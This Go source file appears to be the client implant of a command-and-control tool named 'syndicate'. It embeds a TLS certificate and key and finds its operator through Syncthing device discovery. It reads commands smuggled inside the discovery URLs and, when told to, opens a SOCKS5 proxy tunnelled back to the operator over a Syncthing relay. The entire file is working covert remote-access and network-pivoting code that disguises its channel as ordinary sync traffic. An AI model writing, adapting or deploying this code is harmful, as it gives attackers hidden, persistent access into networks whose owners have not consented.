package main

import (
	"context"
	"crypto/tls"
	_ "embed"
	"encoding/binary"
	"log"
	"net/url"
	"runtime/debug"
	"slices"
	"time"

	"gitlab.torproject.org/acheong08/syndicate/lib"
	"gitlab.torproject.org/acheong08/syndicate/lib/commands"
	"gitlab.torproject.org/acheong08/syndicate/lib/utils"

	"github.com/rotisserie/eris"
	"github.com/syncthing/syncthing/lib/protocol"
)

//go:embed certs/client.crt
var certPem []byte

//go:embed certs/client.key
var keyPem []byte

var serverID = "" // Override with `-ldflags "-X main.serverID=..."`

var serverDeviceID protocol.DeviceID

var clientDeviceID protocol.DeviceID

const timeout = 20 * time.Second

var cert tls.Certificate

func init() {
	var err error
	serverDeviceID, err = protocol.DeviceIDFromString(serverID)
	if err != nil {
		panic(err)
	}
	cert, err = tls.X509KeyPair(certPem, keyPem)
	if err != nil {
		panic(err)
	}
	clientDeviceID = protocol.NewDeviceID(cert.Certificate[0])
	log.SetFlags(log.Lshortfile)
}

func main() {
	var insID []uint32
	jobs := make(map[commands.Command]context.CancelFunc)
	for {
		defer func() {
			err := recover()
			if err != nil {
				log.Println("stack trace from panic", debug.Stack())
			}
		}()
		err := func() error {
			ctx, cancel := context.WithTimeout(context.Background(), timeout)
			defer cancel()
			syncthing, err := lib.NewSyncthing(ctx, cert, nil, false)
			if err != nil {
				return err
			}
			addresses, err := syncthing.Lookup(serverDeviceID)
			if err != nil {
				return eris.Wrap(err, "syncthing lookup failed")
			}
			relayAddress := addresses[0]
			var data []byte = nil
			for _, address := range addresses[1:] {
				tmpData, err := utils.DecodeURLs([]url.URL{address}, clientDeviceID)
				if err != nil {
					return eris.Wrapf(err, "could not decode URL %s", address.String())
				}

				if len(tmpData) < 5 {
					return eris.New("recieved insufficient data")
				}
				// Check if the instruction ID is already processed
				commandID := binary.BigEndian.Uint32(tmpData[1:5])
				if slices.Contains(insID, commandID) {
					log.Println("Already processed", commandID)
					continue
				}
				data = tmpData
				insID = append(insID, commandID)
				break
			}
			if data == nil {
				log.Println("All instructions already processed")
				return nil
			}
			command := commands.Command(data[0])

			switch command {
			case commands.StartSocks5:
				{
					if _, ok := jobs[command]; ok {
						jobs[command]()
						delete(jobs, command)
					}
					ctx, cancel := context.WithCancel(context.Background())
					go lib.StartSocksServer(ctx, relayAddress.String(), cert, serverDeviceID)
					jobs[command] = cancel
				}
			case commands.StopSocks5:
				if cancel, ok := jobs[commands.StartSocks5]; ok {
					log.Println("Cancelling socks5 server")
					cancel()
					delete(jobs, command)
				}
			}
			return nil
		}()
		if err != nil {
			log.Println(eris.ToString(err, true))
		}
		time.Sleep(time.Second * 10)
		continue

	}
}
